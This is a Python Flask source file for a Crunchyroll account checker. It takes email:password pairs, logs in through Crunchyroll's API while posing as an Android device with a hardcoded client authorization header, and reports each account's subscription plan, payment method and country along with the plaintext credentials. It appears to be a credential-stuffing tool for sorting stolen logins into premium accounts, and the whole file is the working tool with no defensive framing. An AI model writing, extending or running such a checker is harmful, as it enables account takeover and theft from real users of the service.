from flask import Flask, request, jsonify
import requests
import json
import urllib.parse
import uuid

# Initialize Flask app
app = Flask(__name__)

# Full Country codes dictionary with flags
country_codes = {
    "AF": "Afghanistan 🇦🇫", "AX": "Åland Islands 🇦🇽", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
    "AS": "American Samoa 🇦🇸", "AD": "Andorra 🇦🇩", "AO": "Angola 🇦🇴", "AI": "Anguilla 🇦🇮",
    "AQ": "Antarctica 🇦🇶", "AG": "Antigua and Barbuda 🇦🇬", "AR": "Argentina 🇦🇷", "AM": "Armenia 🇦🇲",
    "AW": "Aruba 🇦🇼", "AU": "Australia 🇦🇺", "AT": "Austria 🇦🇹", "AZ": "Azerbaijan 🇦🇿",
    "BS": "Bahamas 🇧🇸", "BH": "Bahrain 🇧🇭", "BD": "Bangladesh 🇧🇩", "BB": "Barbados 🇧🇧",
    "BY": "Belarus 🇧🇾", "BE": "Belgium 🇧🇪", "BZ": "Belize 🇧🇿", "BJ": "Benin 🇧🇯",
    "BM": "Bermuda 🇧🇲", "BT": "Bhutan 🇧🇹", "BO": "Bolivia 🇧🇴", "BA": "Bosnia and Herzegovina 🇧🇦",
    "BW": "Botswana 🇧🇼", "BV": "Bouvet Island 🇧🇻", "BR": "Brazil 🇧🇷", "IO": "British Indian Ocean Territory 🇮🇴",
    "BN": "Brunei Darussalam 🇧🇳", "BG": "Bulgaria 🇧🇬", "BF": "Burkina Faso 🇧🇫", "BI": "Burundi 🇧🇮",
    "CV": "Cabo Verde 🇨🇻", "KH": "Cambodia 🇰🇭", "CM": "Cameroon 🇨🇲", "CA": "Canada 🇨🇦",
    "KY": "Cayman Islands 🇰🇾", "CF": "Central African Republic 🇨🇫", "TD": "Chad 🇹🇩", "CL": "Chile 🇨🇱",
    "CN": "China 🇨🇳", "CX": "Christmas Island 🇨🇽", "CC": "Cocos (Keeling) Islands 🇨🇨", "CO": "Colombia 🇨🇴",
    "KM": "Comoros 🇰🇲", "CG": "Congo 🇨🇬", "CD": "Congo (DRC) 🇨🇩", "CK": "Cook Islands 🇨🇰",
    "CR": "Costa Rica 🇨🇷", "CI": "Côte d'Ivoire 🇨🇮", "HR": "Croatia 🇭🇷", "CU": "Cuba 🇨🇺",
    "CW": "Curaçao 🇨🇼", "CY": "Cyprus 🇨🇾", "CZ": "Czechia 🇨🇿", "DK": "Denmark 🇩🇰",
    "DJ": "Djibouti 🇩🇯", "DM": "Dominica 🇩🇲", "DO": "Dominican Republic 🇩🇴", "EC": "Ecuador 🇪🇨",
    "EG": "Egypt 🇪🇬", "SV": "El Salvador 🇸🇻", "GQ": "Equatorial Guinea 🇬🇶", "ER": "Eritrea 🇪🇷",
    "EE": "Estonia 🇪🇪", "SZ": "Eswatini 🇸🇿", "ET": "Ethiopia 🇪🇹", "FK": "Falkland Islands 🇫🇰",
    "FO": "Faroe Islands 🇫🇴", "FJ": "Fiji 🇫🇯", "FI": "Finland 🇫🇮", "FR": "France 🇫🇷",
    "GF": "French Guiana 🇬🇫", "PF": "French Polynesia 🇵🇫", "TF": "French Southern Territories 🇹🇫", "GA": "Gabon 🇬🇦",
    "GM": "Gambia 🇬🇲", "GE": "Georgia 🇬🇪", "DE": "Germany 🇩🇪", "GH": "Ghana 🇬🇭",
    "GI": "Gibraltar 🇬🇮", "GR": "Greece 🇬🇷", "GL": "Greenland 🇬🇱", "GD": "Grenada 🇬🇩",
    "GP": "Guadeloupe 🇬🇵", "GU": "Guam 🇬🇺", "GT": "Guatemala 🇬🇹", "GG": "Guernsey 🇬🇬",
    "GN": "Guinea 🇬🇳", "GW": "Guinea-Bissau 🇬🇼", "GY": "Guyana 🇬🇾", "HT": "Haiti 🇭🇹",
    "HM": "Heard Island and McDonald Islands 🇭🇲", "VA": "Vatican City 🇻🇦", "HN": "Honduras 🇭🇳", "HK": "Hong Kong 🇭🇰",
    "HU": "Hungary 🇭🇺", "IS": "Iceland 🇮🇸", "IN": "India 🇮🇳", "ID": "Indonesia 🇮🇩",
    "IR": "Iran 🇮🇷", "IQ": "Iraq 🇮🇶", "IE": "Ireland 🇮🇪", "IM": "Isle of Man 🇮🇲",
    "IL": "Israel 🇮🇱", "IT": "Italy 🇮🇹", "JM": "Jamaica 🇯🇲", "JP": "Japan 🇯🇵",
    "JE": "Jersey 🇯🇪", "JO": "Jordan 🇯🇴", "KZ": "Kazakhstan 🇰🇿", "KE": "Kenya 🇰🇪",
    "KI": "Kiribati 🇰🇮", "KP": "Korea (North) 🇰🇵", "KR": "Korea (South) 🇰🇷", "KW": "Kuwait 🇰🇼",
    "KG": "Kyrgyzstan 🇰🇬", "LA": "Lao 🇱🇦", "LV": "Latvia 🇱🇻", "LB": "Lebanon 🇱🇧",
    "LS": "Lesotho 🇱🇸", "LR": "Liberia 🇱🇷", "LY": "Libya 🇱🇾", "LI": "Liechtenstein 🇱🇮",
    "LT": "Lithuania 🇱🇹", "LU": "Luxembourg 🇱🇺", "MO": "Macao 🇲🇴", "MG": "Madagascar 🇲🇬",
    "MW": "Malawi 🇲🇼", "MY": "Malaysia 🇲🇾", "MV": "Maldives 🇲🇻", "ML": "Mali 🇲🇱",
    "MT": "Malta 🇲🇹", "MH": "Marshall Islands 🇲🇭", "MQ": "Martinique 🇲🇶", "MR": "Mauritania 🇲🇷",
    "MU": "Mauritius 🇲🇺", "YT": "Mayotte 🇾🇹", "MX": "Mexico 🇲🇽", "FM": "Micronesia 🇫🇲",
    "MD": "Moldova 🇲🇩", "MC": "Monaco 🇲🇨", "MN": "Mongolia 🇲🇳", "ME": "Montenegro 🇲🇪",
    "MS": "Montserrat 🇲🇸", "MA": "Morocco 🇲🇦", "MZ": "Mozambique 🇲🇿", "MM": "Myanmar 🇲🇲",
    "NA": "Namibia 🇳🇦", "NR": "Nauru 🇳🇷", "NP": "Nepal 🇳🇵", "NL": "Netherlands 🇳🇱",
    "NC": "New Caledonia 🇳🇨", "NZ": "New Zealand 🇳🇿", "NI": "Nicaragua 🇳🇮", "NE": "Niger 🇳🇪",
    "NG": "Nigeria 🇳🇬", "NU": "Niue 🇳🇺", "NF": "Norfolk Island 🇳🇫", "MK": "North Macedonia 🇲🇰",
    "MP": "Northern Mariana Islands 🇲🇵", "NO": "Norway 🇳🇴", "OM": "Oman 🇴🇲", "PK": "Pakistan 🇵🇰",
    "PW": "Palau 🇵🇼", "PS": "Palestine 🇵🇸", "PA": "Panama 🇵🇦", "PG": "Papua New Guinea 🇵🇬",
    "PY": "Paraguay 🇵🇾", "PE": "Peru 🇵🇪", "PH": "Philippines 🇵🇭", "PN": "Pitcairn Islands 🇵🇳",
    "PL": "Poland 🇵🇱", "PT": "Portugal 🇵🇹", "PR": "Puerto Rico 🇵🇷", "QA": "Qatar 🇶🇦",
    "RE": "Réunion 🇷🇪", "RO": "Romania 🇷🇴", "RU": "Russia 🇷🇺", "RW": "Rwanda 🇷🇼",
    "BL": "Saint Barthélemy 🇧🇱", "SH": "Saint Helena 🇸🇭", "KN": "Saint Kitts and Nevis 🇰🇳", "LC": "Saint Lucia 🇱🇨",
    "MF": "Saint Martin 🇲🇫", "PM": "Saint Pierre and Miquelon 🇵🇲", "VC": "Saint Vincent and the Grenadines 🇻🇨", "WS": "Samoa 🇼🇸",
    "SM": "San Marino 🇸🇲", "ST": "São Tomé and Príncipe 🇸🇹", "SA": "Saudi Arabia 🇸🇦", "SN": "Senegal 🇸🇳",
    "RS": "Serbia 🇷🇸", "SC": "Seychelles 🇸🇨", "SL": "Sierra Leone 🇸🇱", "SG": "Singapore 🇸🇬",
    "SX": "Sint Maarten 🇸🇽", "SK": "Slovakia 🇸🇰", "SI": "Slovenia 🇸🇮", "SB": "Solomon Islands 🇸🇧",
    "SO": "Somalia 🇸🇴", "ZA": "South Africa 🇿🇦", "GS": "South Georgia and the South Sandwich Islands 🇬🇸", "SS": "South Sudan 🇸🇸",
    "ES": "Spain 🇪🇸", "LK": "Sri Lanka 🇱🇰", "SD": "Sudan 🇸🇩", "SR": "Suriname 🇸🇷",
    "SJ": "Svalbard and Jan Mayen 🇸🇯", "SE": "Sweden 🇸🇪", "CH": "Switzerland 🇨🇭", "SY": "Syria 🇸🇾",
    "TW": "Taiwan 🇹🇼", "TJ": "Tajikistan 🇹🇯", "TZ": "Tanzania 🇹🇿", "TH": "Thailand 🇹🇭",
    "TL": "Timor-Leste 🇹🇱", "TG": "Togo 🇹🇬", "TK": "Tokelau 🇹🇰", "TO": "Tonga 🇹🇴",
    "TT": "Trinidad and Tobago 🇹🇹", "TN": "Tunisia 🇹🇳", "TR": "Turkey 🇹🇷", "TM": "Turkmenistan 🇹🇲",
    "TC": "Turks and Caicos Islands 🇹🇨", "TV": "Tuvalu 🇹🇻", "UG": "Uganda 🇺🇬", "UA": "Ukraine 🇺🇦",
    "AE": "United Arab Emirates 🇦🇪", "GB": "United Kingdom 🇬🇧", "US": "United States 🇺🇸", "UM": "United States Minor Outlying Islands 🇺🇲",
    "UY": "Uruguay 🇺🇾", "UZ": "Uzbekistan 🇺🇿", "VU": "Vanuatu 🇻🇺", "VE": "Venezuela 🇻🇪",
    "VN": "Vietnam 🇻🇳", "VG": "British Virgin Islands 🇻🇬", "VI": "U.S. Virgin Islands 🇻🇮", "WF": "Wallis and Futuna 🇼🇫",
    "EH": "Western Sahara 🇪🇭", "YE": "Yemen 🇾🇪", "ZM": "Zambia 🇿🇲", "ZW": "Zimbabwe 🇿🇼"
}

@app.route('/check', methods=['GET'])
def check_credentials():
    # Extract 'crunchy' query parameter (email:password)
    crunchy = request.args.get('crunchy')
    if not crunchy or ':' not in crunchy:
        return jsonify({"error": "Invalid format. Use crunchy=email:password"}), 400

    email, password = crunchy.split(':', 1)

    # Generate unique device ID (GUID)
    guid = str(uuid.uuid4())

    # URL encode username and password
    em = urllib.parse.quote_plus(email)
    ps = urllib.parse.quote_plus(password)

    # Login request
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    content_data = f"username={em}&password={ps}&grant_type=password&scope=offline_access&device_id={guid}&device_name=SM-G988N&device_type=samsung%20SM-G977N"
    headers = {
        'Host': 'beta-api.crunchyroll.com',
        'authorization': 'Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=',
        'etp-anonymous-id': '39cf8dfa-efff-49fb-8125-45cfb5cdcd7e',
        'content-type': 'application/x-www-form-urlencoded; charset=utf-8',
        'accept-encoding': 'gzip',
        'content-length': str(len(content_data))
    }

    response = requests.post(url, data=content_data, headers=headers)
    response_text = response.text

    try:
        json_response = response.json()
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON response from server"}), 500

    # Check for login success or failure
    if response.status_code == 401:
        return jsonify({"status": "Login failed"}), 401

    # Extract tokens and account_id
    tk = json_response.get('access_token', '')
    account_id = json_response.get('account_id', '')

    # Get account info
    url_me = 'https://beta-api.crunchyroll.com/accounts/v1/me'
    headers_me = {
        'Host': 'beta-api.crunchyroll.com',
        'authorization': f'Bearer {tk}',
        'etp-anonymous-id': '80de41e3-7f84-47e6-9f6a-b611138613ed',
        'accept-encoding': 'gzip',
        'user-agent': 'Crunchyroll/3.54.0-s Android/9 okhttp/4.12.0'
    }

    response_me = requests.get(url_me, headers=headers_me)
    try:
        json_response_me = response_me.json()
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON response from server"}), 500

    # Extract external_id
    external_id = json_response_me.get('external_id', '')

    # Get subscription benefits
    url_benefits = f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits'
    headers_benefits = {
        'Host': 'beta-api.crunchyroll.com',
        'authorization': f'Bearer {tk}',
        'etp-anonymous-id': '80de41e3-7f84-47e6-9f6a-b611138613ed',
        'accept-encoding': 'gzip',
        'user-agent': 'Crunchyroll/3.54.0-s Android/9 okhttp/4.12.0'
    }

    response_benefits = requests.get(url_benefits, headers=headers_benefits)
    response_benefits_text = response_benefits.text

    try:
        json_response_benefits = response_benefits.json()
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON response from server"}), 500

    # Check for access forbidden (403)
    if response_benefits.status_code == 403:
        return jsonify({"status": "Access forbidden (403)"}), 403

    # Determine subscription status
    is_free = (
        "subscription.not_found" in response_benefits_text or
        "Subscription Not Found" in response_benefits_text or
        "\"subscription_country\":\"" not in response_benefits_text or
        "total\":0," in response_benefits_text
    )

    is_subscriber = (
        "subscription.not_found\"" not in response_benefits_text and
        "\"subscription_country\":\"" in response_benefits_text and
        "total\":0," not in response_benefits_text
    )

    if is_subscriber:
        subscription_status = "? Premium"
    elif is_free:
        subscription_status = "? Free User"
    else:
        subscription_status = "Unable to determine subscription status"

    # Get subscription country from subscription details
    country_code = json_response_benefits.get('subscription_country', '')
    country = country_codes.get(country_code, country_code if country_code else "Unknown")

    # Fallback: Extract country from account info if not found in subscription details
    account_country = json_response_me.get('country', '')
    if not country or country == "Unknown":
        country = country_codes.get(account_country, account_country if account_country else "Unknown")

    # Extract payment method
    payment_method = "Unknown"
    if 'source":"' in response_benefits_text:
        start_index = response_benefits_text.find('source":"') + len('source":"')
        end_index = response_benefits_text.find('"', start_index)
        payment_method = response_benefits_text[start_index:end_index].strip()

    # Extract plan details and improve benefit extraction
    benefits_list = json_response_benefits.get('benefits', [])
    benefit_values = [benefit.get('benefit', '') for benefit in benefits_list]

    # Extract concurrent streams for plan
    st_list = [benefit for benefit in benefit_values if 'concurrent_streams.' in benefit]
    st = ''.join(st_list).replace(' ', '')

    # Map 'st' to plan names
    plan_translation = {
        "concurrent_streams.4": "MEGA FAN MEMBER",
        "concurrent_streams.1": "FAN MEMBER",
        "concurrent_streams.6": "ULTIMATE FAN MEMBER"
    }

    # Improved mapping and fallback if not found
    plan_name = plan_translation.get(st, st.replace('concurrent_streams.', '').capitalize() if st else "Unknown Plan")

    # Build result as JSON response
    result = {
        "subscription_status": subscription_status,
        "email": email,
        "password": password,
        "plan": plan_name,
        "payment_method": payment_method,
        "country": country,
        "by": "@kiltes"
    }

    return jsonify(result), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
